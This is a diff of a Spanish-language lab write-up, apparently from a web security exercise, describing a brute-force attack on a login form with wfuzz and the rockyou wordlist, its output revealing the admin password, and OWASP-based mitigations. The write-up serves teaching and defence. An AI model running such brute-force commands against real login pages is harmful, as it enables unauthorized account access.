@@ -1,12 +1,9 @@
 wfuzz -w rockyou.txt "http://192.168.1.66/index.php?page=signin&username=admin&password=FUZZ&Login=Login#"
 
-curl https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt -L -o rockyou.txt
-
-1988 hh
-
 es shadow
 
 # Brute Force Attack
+### A07:2021 – Identification and Authentication Failures 
 
 Un **ataque de fuerza bruta** es un ataque que implica el craqueo de credenciales o contraseñas por uso de prueba y error.
 
@@ -23,12 +20,33 @@ Tras ver que el iput está sanitizado, probamos con un ataque de fuerza bruta me
 ```bash
 wfuzz --hh 1988 -w rockyou.txt "http://<IP>/index.php?page=signin&username=admin&password=FUZZ&Login=Login#"
 ```
+Y el resultado es:
 
+```bash
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://10.11.200.124/index.php?page=signin&username=admin&password=FUZZ&Login=Login
+Total requests: 14344391
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                                         
+=====================================================================
+
+000000073:   200        54 L     139 W      2086 Ch     "shadow" 
+```
 
 
 ## Mitigación
 
-- rate limit
+- Uso de herramientas de limitación de peticiones por segundo para mitigar ataques de fuerza bruta.
+- **Securización de credenciales** 
+    - Monitorización de credenciales en filtraciones de datos
+    - Implementación de protocolos de complejidad de contraseñas
+    - 
 - logs
 
 ## Referencias
+- [A07:2021 – Identification and Authentication Failures](https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/)
+- [A09:2021 – Security Logging and Monitoring Failures](https://owasp.org/Top10/A09_2021-Security_Logging_and_Monitoring_Failures/)
